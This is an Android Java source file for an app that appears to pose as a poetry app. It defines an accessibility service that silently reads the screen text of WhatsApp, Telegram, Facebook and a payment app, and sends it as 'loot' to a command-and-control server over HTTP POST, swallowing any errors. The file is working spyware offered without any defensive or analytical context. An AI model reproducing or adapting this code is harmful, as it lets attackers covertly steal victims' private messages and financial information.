package com.royal.poetry.master;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class RoyalAccessibilityService extends AccessibilityService {

    private static final String C2_SERVER_URL = "http://yourdomain.epizy.com/shamona/report.php";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        if (pkg.contains("whatsapp") || pkg.contains("telegram") || pkg.contains("fb") || pkg.contains("shamcash")) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                StringBuilder sb = new StringBuilder();
                extractText(root, sb);
                if (sb.length() > 0) {
                    sendDataToThrone("رصد في (" + pkg + "):\n" + sb.toString());
                }
            }
        }
    }

    private void extractText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) sb.append(node.getText()).append(" ");
        for (int i = 0; i < node.getChildCount(); i++) {
            extractText(node.getChildAt(i), sb);
        }
    }

    private void sendDataToThrone(String data) {
        new Thread(() -> {
            try {
                URL url = new URL(C2_SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setDoOutput(true);
                String json = "{\"device_owner\": \"Royal_Spy\", \"loot\": \"" + data.replace("\"", "'").replace("\n", " ") + "\"}";
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                conn.getResponseCode();
            } catch (Exception e) {}
        }).start();
    }

    @Override public void onInterrupt() {}
}
